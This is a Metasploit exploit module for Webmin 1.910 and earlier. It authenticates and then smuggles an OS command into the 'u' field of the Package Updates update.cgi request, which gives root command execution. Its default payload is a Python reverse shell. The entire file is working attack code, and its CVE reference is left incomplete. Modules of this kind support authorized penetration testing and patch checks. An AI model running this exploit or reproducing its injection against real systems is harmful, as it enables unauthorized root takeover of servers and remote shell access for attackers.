##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Webmin <= 1.910 - "Package Updates" Remote Command Execution',
      'Description'    => %q(
        This module exploits an arbitrary command execution vulnerability in Webmin
        1.910 and lower versions. Any user authorized to the "Package Updates"
        module can execute arbitrary commands with root privileges.

      ),
      'Author'         => [
        'AkkuS <Özkan Mustafa Akkuş>' # Vulnerability Discovery, MSF PoC module
      ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2019-'],
          ['URL', 'https://www.pentest.com.tr/exploits/Webmin-1910-Package-Updates-Remote-Command-Execution.html']
        ],
      'Privileged'     => true,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 512,
          'Compat'      =>
            {
              'PayloadType' => 'cmd'
            }
        },
      'DefaultOptions' =>
        {
          'RPORT' => 10000,
          'SSL'   => false,
          'PAYLOAD' => 'cmd/unix/reverse_python' # its depends
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        => [['Webmin <= 1.910', {}]],
      'DisclosureDate' => 'May 16 2019',
      'DefaultTarget'  => 0)
    )
    register_options [
        OptString.new('USERNAME',  [true, 'Webmin Username']),
        OptString.new('PASSWORD',  [true, 'Webmin Password']),
        OptString.new('TARGETURI',  [true, 'Base path for Webmin application', '/'])
    ]
  end

  def peer
    "#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}"
  end

  def login
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri, 'session_login.cgi'),
      'cookie' => 'testing=1',
      'vars_post' => {
        'page' => '',
        'user' => datastore['USERNAME'],
        'pass' => datastore['PASSWORD']
      }
    })

    if res && res.code == 302 && res.get_cookies =~ /sid=(\w+)/
      return $1
    end

    return nil unless res
    ''
  end
##
# Target and input verification
##
  def check
    cookie = login
    return CheckCode::Detected if cookie == ''
    return CheckCode::Unknown if cookie.nil?

    vprint_status('Attempting to execute...')
    # check package update priv
    res = send_request_cgi({
      'uri'     => normalize_uri(target_uri.path, "package-updates/"),
      'cookie'  => "sid=#{cookie}"
    })

    if res && res.code == 200 && res.body =~ /Software Package Update/
      print_status("NICE! #{datastore['USERNAME']} has the right to >>Package Update<<")
      return CheckCode::Vulnerable
    end
    print_error("#{datastore['USERNAME']} has not the right to >>Package Update<<")
    print_status("Please try with another user account!")
    CheckCode::Safe
  end
##
# Exploiting phase
##
  def exploit
    cookie = login
    if cookie == '' || cookie.nil?
      fail_with(Failure::Unknown, 'Failed to retrieve session cookie')
    end
    print_good("Session cookie: #{cookie}")

    res = send_request_raw(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri, 'proc', 'index_tree.cgi'),
      'headers' =>
        {
          'Referer' => "#{peer}/sysinfo.cgi?xnavigation=1"
        },
      'cookie' => "redirect=1; testing=1; sid=#{cookie}"
    )
    unless res && res.code == 200
      fail_with(Failure::Unknown, 'Request failed')
    end

    print_status("Attempting to execute the payload...")
    exec(cookie)

  end

  def exec(cookie)

    command = payload.encoded

    res = send_request_cgi(
      {
      'method' => 'POST',
      'cookie' => "sid=#{cookie}",
      'ctype'  => 'application/x-www-form-urlencoded',
      'uri' => normalize_uri(target_uri.path, 'package-updates', 'update.cgi'),
      'headers' =>
        {
          'Referer' => "#{peer}/package-updates/?xnavigation=1"
        },
      'data' => "u=acl%2Fapt&u=%20%7C%20#{command}&ok_top=Update+Selected+Packages"
      })

  end
end
##
# The end of the adventure (o_O) // AkkuS
##

